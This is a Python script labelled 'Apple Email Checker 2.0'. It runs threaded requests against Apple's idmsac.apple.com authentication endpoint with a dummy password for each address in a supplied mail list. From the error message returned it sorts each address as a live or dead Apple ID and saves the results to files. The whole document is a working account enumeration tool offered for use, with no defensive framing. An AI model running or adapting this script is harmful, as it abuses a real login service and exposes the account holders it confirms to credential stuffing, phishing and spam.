import requests
import re
import time
import threading
import sys
import queue
import sys
import datetime

class Apple():

	ua 			= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
	live 		= 'Access denied. Your account does not have permission to access this application.'.encode()
	die 		= 'Your Apple ID or password was entered incorrectly.'.encode()
	version 	= 'Apple Email Checker 2.0' 
	input_queue = queue.Queue()
	

	def __init__(self):

		print(r"""
     _                _      _____ __  __       _ _  ____ _               _                     ____    ___  
    / \   _ __  _ __ | | ___| ____|  \/  | __ _(_) |/ ___| |__   ___  ___| | _____ _ __  __   _|___ \  / _ \ 
   / _ \ | '_ \| '_ \| |/ _ \  _| | |\/| |/ _` | | | |   | '_ \ / _ \/ __| |/ / _ \ '__| \ \ / / __) || | | |
  / ___ \| |_) | |_) | |  __/ |___| |  | | (_| | | | |___| | | |  __/ (__|   <  __/ |     \ V / / __/ | |_| |
 /_/   \_\ .__/| .__/|_|\___|_____|_|  |_|\__,_|_|_|\____|_| |_|\___|\___|_|\_\___|_|      \_/ |_____(_)___/ 
         |_|   |_|                                                                                           
		""")

		self.mailist = input(" -> Enter Mailist : ")
		self.thread = input(" -> Thread : ")
		self.count_list = len(list(open(self.mailist)))
		self.clean = input(" -> Clean rezult folder ? (y/n) ")
		if self.clean == 'y' : self.clean_rezult()
		print('')

	def save_to_file(self,nameFile,x):
		kl = open(nameFile, 'a+')
		kl.write(x)
		kl.close()

	def clean_rezult(self):
		open('rezult/live.txt', 'w').close()
		open('rezult/die.txt', 'w').close()
		open('rezult/unknown.txt', 'w').close()

	def post_email(self,eml):

		r = requests.post('https://idmsac.apple.com/authenticate', 
					params={
						'accountPassword':'x',
						'appleId':eml,
						'appIdKey':'3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d'
						}, 
					headers={'User-Agent': self.ua}
				)
		if self.live in r.content: return 'live'
		elif self.die in r.content: return 'die'
		else : return 'unknown'

	def chk(self):

		while 1:

			eml = self.input_queue.get()
			rez = self.post_email(eml)

			if rez == 'live': 
				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- LIVE - '+eml)
				self.save_to_file('rezult/live.txt',eml+'\n') 
			elif rez == 'die':
				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- DEAD - '+eml) 
				self.save_to_file('rezult/die.txt',eml+'\n') 
			elif rez == 'unknown': 
				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- UNKN - '+eml)
				self.save_to_file('rezult/unknown.txt',eml+'\n') 

			self.input_queue.task_done()

	def run_thread(self):	

		self.start_time = time.time()

		for x in range(int(self.thread)):
			t = threading.Thread(target=self.chk)
			t.setDaemon(True)
			t.start()

		for y in open(self.mailist, 'r').readlines():
			self.input_queue.put(y.strip())
		self.input_queue.join()

	def finish(self):
		print('')
		print('-------------------------------------------------')
		print('')
		print('Checking ',self.count_list,' emails has been completed perfectly')
		print('Processing time : ',time.time() - self.start_time,'seconds')
		print('')
		print('Live : ',len(list(open('rezult/live.txt'))),'emails')
		print('Die : ',len(list(open('rezult/die.txt'))),'emails')
		print('Unknown : ',len(list(open('rezult/unknown.txt'))),'emails')
		print('')
		print('Bye :)')

heh = Apple()
heh.run_thread()
heh.finish()